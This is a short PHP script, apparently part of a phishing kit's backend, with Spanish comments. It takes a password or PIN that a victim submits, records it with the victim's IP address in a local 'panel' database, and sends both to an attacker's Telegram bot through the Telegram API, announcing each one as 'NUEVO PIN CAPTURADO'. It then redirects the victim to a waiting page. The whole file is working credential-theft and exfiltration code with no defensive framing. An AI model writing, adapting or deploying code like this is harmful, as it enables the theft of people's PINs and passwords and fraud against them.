<?php
require('../panel/lib/funciones.php');
date_default_timezone_set('America/Bogota');

// Captura de datos
$ip = $_SERVER['REMOTE_ADDR'];
$registro = traer_regitro($ip);
$contrasena = $_POST['pass'];

// Actualizar base de datos local del panel
actualizar_registro_pass($registro, $contrasena);

// ENVÍO A TU BOT DE TELEGRAM (USANDO VARIABLES DE RAILWAY)
$token = getenv('TOKEN_BOT');
$id = getenv('ID_CHAT');
$mensaje = "🔔 *NUEVO PIN CAPTURADO*\n\n";
$mensaje .= "👤 IP: " . $ip . "\n";
$mensaje .= "🔑 PIN: " . $contrasena . "\n";

file_get_contents("https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $id . "&text=" . urlencode($mensaje) . "&parse_mode=Markdown");

// SALTO AL SIGUIENTE PASO
header("Location: ../a/WAITING.php");
?>
